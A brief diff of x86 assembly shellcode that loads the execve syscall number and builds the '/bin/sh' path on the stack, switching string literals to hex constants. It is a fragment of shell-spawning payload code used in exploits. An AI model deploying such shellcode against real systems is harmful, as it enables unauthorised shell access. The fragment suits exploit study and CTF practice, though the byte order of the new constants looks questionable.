@@ -9,8 +9,8 @@
 ;;; eax = sys_execve
 mov eax, __NR_SYS_execve
 ;;; write /bin/sh @esp
-mov dword ptr [esp], "nib/"
-mov dword ptr [esp+4], "hs//"
+mov dword ptr [esp], 0x2f62696e
+mov dword ptr [esp+4], 0x2f2f7368
 ;;; ebx = @/bin/sh
 mov ebx, esp
 ;;; nullify the other args
